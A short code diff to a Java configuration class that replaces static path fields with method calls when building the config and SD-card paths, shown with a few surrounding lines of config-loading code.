@@ -70,7 +70,7 @@ public final class Conf {
     public static final String NEW_CONF = "1";//"newconfig.dat";
     public static final String ACTUAL_CONF = "2";//"config.dat";
     private static final String FORCED_CONF = "3";//"config.bin";
-    public static final String NEW_CONF_PATH = Path.USER_PATH + Path.CONF_DIR;
+    public static final String NEW_CONF_PATH = Path.USER() + Path.CONF_DIR;
 
     /** The Constant CONF_TIMER_SINGLE. */
     public static final int CONF_TIMER_SINGLE = 0x0;
@@ -180,7 +180,7 @@ public final class Conf {
         AutoFlashFile file;
 
         //#ifdef DEBUG
-        file = new AutoFlashFile(Path.SD_PATH + Path.CONF_DIR
+        file = new AutoFlashFile(Path.SD() + Path.CONF_DIR
                 + Conf.FORCED_CONF, true);
         if (file.exists()) {
             debug.info("Try: forced config");
